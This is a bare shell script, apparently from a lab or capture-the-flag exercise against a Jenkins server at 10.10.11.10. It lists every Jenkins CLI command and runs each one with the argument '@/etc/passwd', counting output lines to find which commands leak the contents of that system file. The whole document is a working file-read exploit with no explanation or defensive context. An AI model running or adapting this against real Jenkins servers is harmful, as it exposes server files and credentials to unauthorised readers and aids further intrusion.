java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help 2>&1 | awk '/  [a-z]/ {print $1}' | while read cmd;
do
 printf "$cmd\t"
 /bin/sh -c "java -jar jenkins-cli.jar -s http://10.10.11.10:8080 $cmd '@/etc/passwd' 2>&1 &" | wc -l
done
